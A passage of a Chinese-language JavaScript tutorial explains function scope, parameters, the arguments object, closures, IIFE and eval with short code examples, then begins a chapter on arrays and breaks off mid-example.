<p>与全局作用域一样，函数作用域内部也会产生“变量提升”现象。<code>var</code>命令声明的变量，不管在什么位置，变量声明都会被提升到函数体的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo(x) {\n  if (x &gt; 100) {\n    var tmp = x - 100;\n  }\n}\n\n// 等同于\nfunction foo(x) {\n  var tmp;\n  if (x &gt; 100) {\n    tmp = x - 100;\n  };\n}</code></pre>\n        <h3>\n            <a href='#函数本身的作用域' class='header-anchor'>#</a>\n            <span>函数本身的作用域</span>\n        </h3>\n    <p>函数本身也是一个值，也有自己的作用域。它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\nvar x = function () {\n  console.log(a);\n};\n\nfunction f() {\n  var a = 2;\n  x();\n}\n\nf() // 1</code></pre><p>上面代码中，函数<code>x</code>是在函数<code>f</code>的外部声明的，所以它的作用域绑定外层，内部变量<code>a</code>不会到函数<code>f</code>体内取值，所以输出<code>1</code>，而不是<code>2</code>。</p>\n<p>总之，函数执行时所在的作用域，是定义时的作用域，而不是调用时所在的作用域。</p>\n<p>很容易犯错的一点是，如果函数<code>A</code>调用函数<code>B</code>，却没考虑到函数<code>B</code>不会引用函数<code>A</code>的内部变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = function () {\n  console.log(a);\n};\n\nfunction y(f) {\n  var a = 2;\n  f();\n}\n\ny(x)\n// ReferenceError: a is not defined</code></pre><p>上面代码将函数<code>x</code>作为参数，传入函数<code>y</code>。但是，函数<code>x</code>是在函数<code>y</code>体外声明的，作用域绑定外层，因此找不到函数<code>y</code>的内部变量<code>a</code>，导致报错。</p>\n<p>同样的，函数体内部声明的函数，作用域绑定函数体内部。</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo() {\n  var x = 1;\n  function bar() {\n    console.log(x);\n  }\n  return bar;\n}\n\nvar x = 2;\nvar f = foo();\nf() // 1</code></pre><p>上面代码中，函数<code>foo</code>内部声明了一个函数<code>bar</code>，<code>bar</code>的作用域绑定<code>foo</code>。当我们在<code>foo</code>外部取出<code>bar</code>执行时，变量<code>x</code>指向的是<code>foo</code>内部的<code>x</code>，而不是<code>foo</code>外部的<code>x</code>。正是这种机制，构成了下文要讲解的“闭包”现象。</p>\n\n        <h2>\n            <a href='#参数' class='header-anchor'>#</a>\n            <span>参数</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p>函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function square(x) {\n  return x * x;\n}\n\nsquare(2) // 4\nsquare(3) // 9</code></pre><p>上式的<code>x</code>就是<code>square</code>函数的参数。每次运行的时候，需要提供这个值，否则得不到结果。</p>\n\n        <h3>\n            <a href='#参数的省略' class='header-anchor'>#</a>\n            <span>参数的省略</span>\n        </h3>\n    <p>函数参数不是必需的，Javascript 允许省略参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {\n  return a;\n}\n\nf(1, 2, 3) // 1\nf(1) // 1\nf() // undefined\n\nf.length // 2</code></pre><p>上面代码的函数<code>f</code>定义了两个参数，但是运行时无论提供多少个参数（或者不提供参数），JavaScript 都不会报错。省略的参数的值就变为<code>undefined</code>。需要注意的是，函数的<code>length</code>属性与实际传入的参数个数无关，只反映函数预期传入的参数个数。</p>\n<p>但是，没有办法只省略靠前的参数，而保留靠后的参数。如果一定要省略靠前的参数，只有显式传入<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {\n  return a;\n}\n\nf( , 1) // SyntaxError: Unexpected token ,(…)\nf(undefined, 1) // undefined</code></pre><p>上面代码中，如果省略第一个参数，就会报错。</p>\n\n        <h3>\n            <a href='#传递方式' class='header-anchor'>#</a>\n            <span>传递方式</span>\n        </h3>\n    <p>函数参数如果是原始类型的值（数值、字符串、布尔值），传递方式是传值传递（passes by value）。这意味着，在函数体内修改参数值，不会影响到函数外部。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = 2;\n\nfunction f(p) {\n  p = 3;\n}\nf(p);\n\np // 2</code></pre><p>上面代码中，变量<code>p</code>是一个原始类型的值，传入函数<code>f</code>的方式是传值传递。因此，在函数内部，<code>p</code>的值是原始值的拷贝，无论怎么修改，都不会影响到原始值。</p>\n<p>但是，如果函数参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（pass by reference）。也就是说，传入函数的原始值的地址，因此在函数内部修改参数，将会影响到原始值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n\nfunction f(o) {\n  o.p = 2;\n}\nf(obj);\n\nobj.p // 2</code></pre><p>上面代码中，传入函数<code>f</code>的是参数对象<code>obj</code>的地址。因此，在函数内部修改<code>obj</code>的属性<code>p</code>，会影响到原始值。</p>\n<p>注意，如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = [1, 2, 3];\n\nfunction f(o) {\n  o = [2, 3, 4];\n}\nf(obj);\n\nobj // [1, 2, 3]</code></pre><p>上面代码中，在函数<code>f</code>内部，参数对象<code>obj</code>被整个替换成另一个值。这时不会影响到原始值。这是因为，形式参数（<code>o</code>）的值实际是参数<code>obj</code>的地址，重新对<code>o</code>赋值导致<code>o</code>指向另一个地址，保存在原地址上的值当然不受影响。</p>\n\n        <h3>\n            <a href='#同名参数' class='header-anchor'>#</a>\n            <span>同名参数</span>\n        </h3>\n    <p>如果有同名的参数，则取最后出现的那个值。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(a);\n}\n\nf(1, 2) // 2</code></pre><p>上面代码中，函数<code>f</code>有两个参数，且参数名都是<code>a</code>。取值的时候，以后面的<code>a</code>为准，即使后面的<code>a</code>没有值或被省略，也是以其为准。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(a);\n}\n\nf(1) // undefined</code></pre><p>调用函数<code>f</code>的时候，没有提供第二个参数，<code>a</code>的取值就变成了<code>undefined</code>。这时，如果要获得第一个<code>a</code>的值，可以使用<code>arguments</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(arguments[0]);\n}\n\nf(1) // 1</code></pre>\n        <h3>\n            <a href='#arguments-对象' class='header-anchor'>#</a>\n            <span>arguments 对象</span>\n        </h3>\n    <p><strong>（1）定义</strong></p>\n<p>由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是<code>arguments</code>对象的由来。</p>\n<p><code>arguments</code>对象包含了函数运行时的所有参数，<code>arguments[0]</code>就是第一个参数，<code>arguments[1]</code>就是第二个参数，以此类推。这个对象只有在函数体内部，才可以使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function (one) {\n  console.log(arguments[0]);\n  console.log(arguments[1]);\n  console.log(arguments[2]);\n}\n\nf(1, 2, 3)\n// 1\n// 2\n// 3</code></pre><p>正常模式下，<code>arguments</code>对象可以在运行时修改。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function(a, b) {\n  arguments[0] = 3;\n  arguments[1] = 2;\n  return a + b;\n}\n\nf(1, 1) // 5</code></pre><p>上面代码中，函数<code>f</code>调用时传入的参数，在函数内部被修改成<code>3</code>和<code>2</code>。</p>\n<p>严格模式下，<code>arguments</code>对象是一个只读对象，修改它是无效的，但不会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function(a, b) {\n  &#039;use strict&#039;; // 开启严格模式\n  arguments[0] = 3; // 无效\n  arguments[1] = 2; // 无效\n  return a + b;\n}\n\nf(1, 1) // 2</code></pre><p>上面代码中，函数体内是严格模式，这时修改<code>arguments</code>对象就是无效的。</p>\n<p>通过<code>arguments</code>对象的<code>length</code>属性，可以判断函数调用时到底带几个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  return arguments.length;\n}\n\nf(1, 2, 3) // 3\nf(1) // 1\nf() // 0</code></pre><p><strong>（2）与数组的关系</strong></p>\n<p>需要注意的是，虽然<code>arguments</code>很像数组，但它是一个对象。数组专有的方法（比如<code>slice</code>和<code>forEach</code>），不能在<code>arguments</code>对象上直接使用。</p>\n<p>如果要让<code>arguments</code>对象使用数组方法，真正的解决方法是将<code>arguments</code>转为真正的数组。下面是两种常用的转换方法：<code>slice</code>方法和逐一填入新数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var args = Array.prototype.slice.call(arguments);\n\n// 或者\nvar args = [];\nfor (var i = 0; i &lt; arguments.length; i++) {\n  args.push(arguments[i]);\n}</code></pre><p><strong>（3）callee 属性</strong></p>\n<p><code>arguments</code>对象带有一个<code>callee</code>属性，返回它所对应的原函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(arguments.callee === f);\n}\n\nf() // true</code></pre><p>可以通过<code>arguments.callee</code>，达到调用函数自身的目的。这个属性在严格模式里面是禁用的，因此不建议使用。</p>\n\n        <h2>\n            <a href='#函数的其他知识点' class='header-anchor'>#</a>\n            <span>函数的其他知识点</span>\n        </h2>\n    \n        <h3>\n            <a href='#闭包' class='header-anchor'>#</a>\n            <span>闭包</span>\n        </h3>\n    <p>闭包（closure）是 Javascript 语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。</p>\n<p>理解闭包，首先必须理解变量作用域。前面提到，JavaScript 有两种作用域：全局作用域和函数作用域。函数内部可以直接读取全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 999;\n\nfunction f1() {\n  console.log(n);\n}\nf1() // 999</code></pre><p>上面代码中，函数<code>f1</code>可以读取全局变量<code>n</code>。</p>\n<p>但是，函数外部无法读取函数内部声明的变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n}\n\nconsole.log(n)\n// Uncaught ReferenceError: n is not defined(</code></pre><p>上面代码中，函数<code>f1</code>内部声明的变量<code>n</code>，函数外是无法读取的。</p>\n<p>如果出于种种原因，需要得到函数内的局部变量。正常情况下，这是办不到的，只有通过变通方法才能实现。那就是在函数的内部，再定义一个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n  function f2() {\n　　console.log(n); // 999\n  }\n}</code></pre><p>上面代码中，函数<code>f2</code>就在函数<code>f1</code>内部，这时<code>f1</code>内部的所有局部变量，对<code>f2</code>都是可见的。但是反过来就不行，<code>f2</code>内部的局部变量，对<code>f1</code>就是不可见的。这就是 JavaScript 语言特有的&quot;链式作用域&quot;结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。</p>\n<p>既然<code>f2</code>可以读取<code>f1</code>的局部变量，那么只要把<code>f2</code>作为返回值，我们不就可以在<code>f1</code>外部读取它的内部变量了吗！</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n  function f2() {\n    console.log(n);\n  }\n  return f2;\n}\n\nvar result = f1();\nresult(); // 999</code></pre><p>上面代码中，函数<code>f1</code>的返回值就是函数<code>f2</code>，由于<code>f2</code>可以读取<code>f1</code>的内部变量，所以就可以在外部获得<code>f1</code>的内部变量了。</p>\n<p>闭包就是函数<code>f2</code>，即能够读取其他函数内部变量的函数。由于在 JavaScript 语言中，只有函数内部的子函数才能读取内部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包最大的特点，就是它可以“记住”诞生的环境，比如<code>f2</code>记住了它诞生的环境<code>f1</code>，所以从<code>f2</code>可以得到<code>f1</code>的内部变量。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。</p>\n<p>闭包的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在。请看下面的例子，闭包使得内部变量记住上一次调用时的运算结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>function createIncrementor(start) {\n  return function () {\n    return start++;\n  };\n}\n\nvar inc = createIncrementor(5);\n\ninc() // 5\ninc() // 6\ninc() // 7</code></pre><p>上面代码中，<code>start</code>是函数<code>createIncrementor</code>的内部变量。通过闭包，<code>start</code>的状态被保留了，每一次调用都是在上一次调用的基础上进行计算。从中可以看到，闭包<code>inc</code>使得函数<code>createIncrementor</code>的内部环境，一直存在。所以，闭包可以看作是函数内部作用域的一个接口。</p>\n<p>为什么会这样呢？原因就在于<code>inc</code>始终在内存中，而<code>inc</code>的存在依赖于<code>createIncrementor</code>，因此也始终在内存中，不会在调用结束后，被垃圾回收机制回收。</p>\n<p>闭包的另一个用处，是封装对象的私有属性和私有方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Person(name) {\n  var _age;\n  function setAge(n) {\n    _age = n;\n  }\n  function getAge() {\n    return _age;\n  }\n\n  return {\n    name: name,\n    getAge: getAge,\n    setAge: setAge\n  };\n}\n\nvar p1 = Person(&#039;张三&#039;);\np1.setAge(25);\np1.getAge() // 25</code></pre><p>上面代码中，函数<code>Person</code>的内部变量<code>_age</code>，通过闭包<code>getAge</code>和<code>setAge</code>，变成了返回对象<code>p1</code>的私有变量。</p>\n<p>注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题。</p>\n\n        <h3>\n            <a href='#立即调用的函数表达式（IIFE）' class='header-anchor'>#</a>\n            <span>立即调用的函数表达式（IIFE）</span>\n        </h3>\n    <p>在 Javascript 中，圆括号<code>()</code>是一种运算符，跟在函数名之后，表示调用该函数。比如，<code>print()</code>就表示调用<code>print</code>函数。</p>\n<p>有时，我们需要在定义函数之后，立即调用该函数。这时，你不能在函数的定义之后加上圆括号，这会产生语法错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>function(){ /* code */ }();\n// SyntaxError: Unexpected token (</code></pre><p>产生这个错误的原因是，<code>function</code>这个关键字即可以当作语句，也可以当作表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 语句\nfunction f() {}\n\n// 表达式\nvar f = function f() {}</code></pre><p>为了避免解析上的歧义，JavaScript 引擎规定，如果<code>function</code>关键字出现在行首，一律解释成语句。因此，JavaScript引擎看到行首是<code>function</code>关键字之后，认为这一段都是函数的定义，不应该以圆括号结尾，所以就报错了。</p>\n<p>解决方法就是不要让<code>function</code>出现在行首，让引擎将其理解成一个表达式。最简单的处理，就是将其放在一个圆括号里面。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function(){ /* code */ }());\n// 或者\n(function(){ /* code */ })();</code></pre><p>上面两种写法都是以圆括号开头，引擎就会认为后面跟的是一个表示式，而不是函数定义语句，所以就避免了错误。这就叫做“立即调用的函数表达式”（Immediately-Invoked Function Expression），简称 IIFE。</p>\n<p>注意，上面两种写法最后的分号都是必须的。如果省略分号，遇到连着两个 IIFE，可能就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 报错\n(function(){ /* code */ }())\n(function(){ /* code */ }())</code></pre><p>上面代码的两行之间没有分号，JavaScript 会将它们连在一起解释，将第二行解释为第一行的参数。</p>\n<p>推而广之，任何让解释器以表达式来处理函数定义的方法，都能产生同样的效果，比如下面三种写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = function(){ return 10; }();\ntrue &amp;&amp; function(){ /* code */ }();\n0, function(){ /* code */ }();</code></pre><p>甚至像下面这样写，也是可以的。</p>\n<pre class=\"prettyprint language-javascript\"><code>!function () { /* code */ }();\n~function () { /* code */ }();\n-function () { /* code */ }();\n+function () { /* code */ }();</code></pre><p>通常情况下，只对匿名函数使用这种“立即执行的函数表达式”。它的目的有两个：一是不必为函数命名，避免了污染全局变量；二是 IIFE 内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nvar tmp = newData;\nprocessData(tmp);\nstoreData(tmp);\n\n// 写法二\n(function () {\n  var tmp = newData;\n  processData(tmp);\n  storeData(tmp);\n}());</code></pre><p>上面代码中，写法二比写法一更好，因为完全避免了污染全局变量。</p>\n\n        <h2>\n            <a href='#eval-命令' class='header-anchor'>#</a>\n            <span>eval 命令</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本用法' class='header-anchor'>#</a>\n            <span>基本用法</span>\n        </h3>\n    <p><code>eval</code>命令接受一个字符串作为参数，并将这个字符串当作语句执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;var a = 1;&#039;);\na // 1</code></pre><p>上面代码将字符串当作语句运行，生成了变量<code>a</code>。</p>\n<p>如果参数字符串无法当作语句运行，那么就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;3x&#039;) // Uncaught SyntaxError: Invalid or unexpected token</code></pre><p>放在<code>eval</code>中的字符串，应该有独自存在的意义，不能用来与<code>eval</code>以外的命令配合使用。举例来说，下面的代码将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;return;&#039;); // Uncaught SyntaxError: Illegal return statement</code></pre><p>上面代码会报错，因为<code>return</code>不能单独使用，必须在函数中使用。</p>\n<p>如果<code>eval</code>的参数不是字符串，那么会原样返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(123) // 123</code></pre><p><code>eval</code>没有自己的作用域，都在当前作用域内执行，因此可能会修改当前作用域的变量的值，造成安全问题。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\neval(&#039;a = 2&#039;);\n\na // 2</code></pre><p>上面代码中，<code>eval</code>命令修改了外部变量<code>a</code>的值。由于这个原因，<code>eval</code>有安全风险。</p>\n<p>为了防止这种风险，JavaScript 规定，如果使用严格模式，<code>eval</code>内部声明的变量，不会影响到外部作用域。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function f() {\n  &#039;use strict&#039;;\n  eval(&#039;var foo = 123&#039;);\n  console.log(foo);  // ReferenceError: foo is not defined\n})()</code></pre><p>上面代码中，函数<code>f</code>内部是严格模式，这时<code>eval</code>内部声明的<code>foo</code>变量，就不会影响到外部。</p>\n<p>不过，即使在严格模式下，<code>eval</code>依然可以读写当前作用域的变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function f() {\n  &#039;use strict&#039;;\n  var foo = 1;\n  eval(&#039;foo = 2&#039;);\n  console.log(foo);  // 2\n})()</code></pre><p>上面代码中，严格模式下，<code>eval</code>内部还是改写了外部变量，可见安全风险依然存在。</p>\n<p>总之，<code>eval</code>的本质是在当前作用域之中，注入代码。由于安全风险和不利于 JavaScript 引擎优化执行速度，所以一般不推荐使用。通常情况下，<code>eval</code>最常见的场合是解析 JSON 数据的字符串，不过正确的做法应该是使用原生的<code>JSON.parse</code>方法。</p>\n\n        <h3>\n            <a href='#eval-的别名调用' class='header-anchor'>#</a>\n            <span>eval 的别名调用</span>\n        </h3>\n    <p>前面说过<code>eval</code>不利于引擎优化执行速度。更麻烦的是，还有下面这种情况，引擎在静态代码分析的阶段，根本无法分辨执行的是<code>eval</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = eval;\nm(&#039;var x = 1&#039;);\nx // 1</code></pre><p>上面代码中，变量<code>m</code>是<code>eval</code>的别名。静态代码分析阶段，引擎分辨不出<code>m(&#39;var x = 1&#39;)</code>执行的是<code>eval</code>命令。</p>\n<p>为了保证<code>eval</code>的别名不影响代码优化，JavaScript 的标准规定，凡是使用别名执行<code>eval</code>，<code>eval</code>内部一律是全局作用域。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\n\nfunction f() {\n  var a = 2;\n  var e = eval;\n  e(&#039;console.log(a)&#039;);\n}\n\nf() // 1</code></pre><p>上面代码中，<code>eval</code>是别名调用，所以即使它是在函数中，它的作用域还是全局作用域，因此输出的<code>a</code>为全局变量。这样的话，引擎就能确认<code>e()</code>不会对当前的函数作用域产生影响，优化的时候就可以把这一行排除掉。</p>\n<p><code>eval</code>的别名调用的形式五花八门，只要不是直接调用，都属于别名调用，因为引擎只能分辨<code>eval()</code>这一种形式是直接调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval.call(null, &#039;...&#039;)\nwindow.eval(&#039;...&#039;)\n(1, eval)(&#039;...&#039;)\n(eval, eval)(&#039;...&#039;)</code></pre><p>上面这些形式都是<code>eval</code>的别名调用，作用域都是全局作用域。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Ben Alman, <a href=\"http://benalman.com/news/2010/11/immediately-invoked-function-expression/\">Immediately-Invoked Function Expression (IIFE)</a></li>\n<li>Mark Daggett, <a href=\"http://markdaggett.com/blog/2013/02/15/functions-explained/\">Functions Explained</a></li>\n<li>Juriy Zaytsev, <a href=\"http://kangax.github.com/nfe/\">Named function expressions demystified</a></li>\n<li>Marco Rogers polotek, <a href=\"http://docs.nodejitsu.com/articles/javascript-conventions/what-is-the-arguments-object\">What is the arguments object?</a></li>\n<li>Juriy Zaytsev, <a href=\"http://perfectionkills.com/global-eval-what-are-the-options/\">Global eval. What are the options?</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2014/01/eval.html\">Evaluating JavaScript code via eval() and new Function()</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"数组","link":"/types/array.html"}],"content":"\n        <h1>\n            <a href='#数组' class='header-anchor'>#</a>\n            <span>数组</span>\n        </h1>\n    \n        <h2>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h2>\n    <p>数组（array）是按次序排列的一组值。每个值的位置都有编号（从0开始），整个数组用方括号表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];</code></pre><p>上面代码中的<code>a</code>、<code>b</code>、<code>c</code>就构成一个数组，两端的方括号是数组的标志。<code>a</code>是0号位置，<code>b</code>是1号位置，<code>c</code>是2号位置。</p>\n<p>除了在定义时赋值，数组也可以先定义后赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\n\narr[0] = &#039;a&#039;;\narr[1] = &#039;b&#039;;\narr[2] = &#039;c&#039;;</code></pre><p>任何类型的数据，都可以放入数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [\n  {a: 1},\n  [1, 2, 3],\n  function() {return true;}\n];\n\narr[0] // Object {a: 1}\narr[1] // [1, 2, 3]\narr[2] // function (){return true;}</code></pre><p>上面数组<code>arr</code>的3个成员依次是对象、数组、函数。</p>\n<p>如果数组的元素还是数组，就形成了多维数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [[1, 2], [3, 4]];\na[0][1] // 2\na[1][1] // 4</code></pre>\n        <h2>\n            <a href='#数组的本质' class='header-anchor'>#</a>\n            <span>数组的本质</span>\n        </h2>\n    <p>本质上，数组属于一种特殊的对象。<code>typeof</code>运算符会返回数组的类型是<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof [1, 2, 3] // &quot;object&quot;</code></pre><p>上面代码表明，<code>typeof</code>运算符认为数组的类型就是对象。</p>\n<p>数组的特殊性体现在，它的键名是按次序排列的一组整数（0，1，2...）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\nObject.keys(arr)\n// [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;]</code></pre><p>上面代码中，<code>Object.keys</code>方法返回数组的所有键名。可以看到数组的键名就是整数0、1、2。</p>\n<p>由于数组成员的键名是固定的（默认总是0、1、2...），因此数组不用为每个元素指定键名，而对象的每个成员都必须指定键名。JavaScript 语言规定，对象的键名一律为字符串，所以，数组的键名其实也是字符串。之所以可以用数值读取，是因为非字符串的键名会被转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\narr[&#039;0&#039;] // &#039;a&#039;\narr[0] // &#039;a&#039;</code></pre><p>上面代码分别用数值和字符串作为键名，结果都能读取数组。原因是数值键名被自动转为了字符串。</p>\n<p>注意，这点在赋值时也成立。如果一个值总是先转成字符串，再进行赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [];\n\na[1.00] = 6;\na[1] // 6</code></pre><p>上面代码中，由于<code>1.00</code>转成字符串是<code>1</code>，所以通过数字键<code>1</code>可以读取值。</p>\n<p>上一章说过，对象有两种读取成员的方法：点结构（<code>object.key</code>）和方括号结构（<code>object[key]</code>）。但是，对于数值的键名，不能使用点结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.0 // SyntaxError</code></pre><p>上面代码中，<code>arr.0</code>的写法不合法，因为单独的数值不能作为标识符（identifier）。所以，数组成员只能用方括号<code>arr[0]</code>表示（方括号是运算符，可以接受数值）。</p>\n\n        <h2>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h2>\n    <p>数组的<code>length</code>属性，返回数组的成员数量。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a&#039;, &#039;b&#039;, &#039;c&#039;].length // 3</code></pre><p>JavaScript 使用一个32位整数，保存数组的元素个数。这意味着，数组成员最多只有 4294967295 个（2<sup>32</sup> - 1）个，也就是说<code>length</code>属性的最大值就是 4294967295。</p>\n<p>只要是数组，就一定有<code>length</code>属性。该属性是一个动态的值，等于键名中的最大整数加上<code>1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;];\narr.length // 2\n\narr[2] = &#039;c&#039;;\narr.length // 3\n\narr[9] = &#039;d&#039;;\narr.length // 10\n\narr[1000] = &#039;e&#039;;\narr.length // 1001</code></pre><p>上面代码表示，数组的数字键不需要连续，<code>length</code>属性的值总是比最大的那个整数键大<code>1</code>。另外，这也表明数组是一种动态的数据结构，可以随时增减数组的成员。</p>\n<p><code>length</code>属性是可写的。如果人为设置一个小于当前成员个数的值，该数组的成员会自动减少到<code>length</code>设置的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\narr.length // 3\n\narr.length = 2;\narr // [&quot;a&quot;, &quot;b&quot;]</code></pre><p>上面代码表示，当数组的<code>length</code>属性设为2（即最大的整数键只能是1）那么整数键2（值为<code>c</code>）就已经不在数组中了，被自动删除了。</p>\n<p>清空数组的一个有效方法，就是将<code>length</code>属性设为0。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\n\narr.length = 0;\narr // []</code></pre><p>如果人为设置<code>length</code>大于当前元素个数，则数组的成员数量会增加到这个值，新增的位置都是空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;];\n\na.length = 3;\na[1] // undefined</code></pre><p>上面代码表示，当<code>length</code>属性设为大于数组个数时，读取新增的位置都会返回<code>undefined</code>。</p>\n<p>如果人为设置<code>length</code>为不合法的值，JavaScript 会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 设置负值\n[].length = -1\n// RangeError: Invalid array length\n\n// 数组元素个数大于等于2的32次方\n[].length = Math.pow(2, 32)\n// RangeError: Invalid array length\n\n// 设置字符串\n[].length = &#039;abc&#039;\n// RangeError: Invalid array length</code></pre><p>值得注意的是，由于数组本质上是一种对象，所以可以为数组添加属性，但是这不影响<code>length</code>属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [];\n\na[&#039;p&#039;] = &#039;abc&#039;;\na.length // 0\n\na[2.1] = &#039;abc&#039;;\na.length // 0</code></pre><p>上面代码将数组的键分别设为字符串和小数，结果都不影响<code>length</code>属性。因为，<code>length</code>属性的值就是等于最大的数字键加1，而这个数组没有整数键，所以<code>length</code>属性保持为<code>0</code>。</p>\n<p>如果数组的键名是添加超出范围的数值，该键名会自动转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr[-1] = &#039;a&#039;;\narr[Math.pow(2, 32)] = &#039;b&#039;;\n\narr.length // 0\narr[-1] // &quot;a&quot;\narr[4294967296] // &quot;b&quot;</code></pre><p>上面代码中，我们为数组<code>arr</code>添加了两个不合法的数字键，结果<code>length</code>属性没有发生变化。这些数字键都变成了字符串键名。最后两行之所以会取到值，是因为取键值时，数字键名会默认转为字符串。</p>\n\n        <h2>\n            <a href='#in-运算符' class='header-anchor'>#</a>\n            <span>in 运算符</span>\n        </h2>\n    <p>检查某个键名是否存在的运算符<code>in</code>，适用于对象，也适用于数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\n2 in arr  // true\n&#039;2&#039; in arr // true\n4 in arr // false</code></pre><p>上面代码表明，数组存在键名为<code>2</code>的键。由于键名都是字符串，所以数值<code>2</code>会自动转成字符串。</p>\n<p>注意，如果数组的某个位置是空位，<code>in</code>运算符返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr[100] = &#039;a&#039;;\n\n100 in arr // true\n1 in arr // false</code></pre><p>上面代码中，数组<code>arr</code>只有一个成员<code>arr[100]</code>，其他位置的键名都会返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#for...in-循环和数组的遍历' class='header-anchor'>#</a>\n            <span>for...in 循环和数组的遍历</span>\n        </h2>\n    <p><code>for...in</code>循环不仅可以遍历对象，也可以遍历数组，毕竟数组只是一种特殊对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\n\nfor (var i in a) {\n  